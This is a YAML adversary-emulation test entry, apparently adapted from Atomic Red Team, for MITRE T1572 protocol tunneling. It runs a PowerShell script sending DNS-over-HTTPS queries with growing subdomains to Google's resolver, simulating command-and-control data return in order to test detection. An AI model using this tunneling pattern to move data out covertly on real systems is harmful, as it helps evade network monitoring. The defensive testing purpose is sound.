- id: 57945ea9-8cdc-50a7-9242-e2d114179ad7
  name: Soumaia ART Tests - DNS over HTTPS Long Domain Query
  description: "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format."
  tactic: command-and-control
  technique:
    attack_id: T1572
    name: Protocol Tunneling
  platforms:
    windows:
      psh:
        command: |-
          Set-Location "PathToAtomicsFolder"
          .\T1572\src\T1572-doh-domain-length.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT
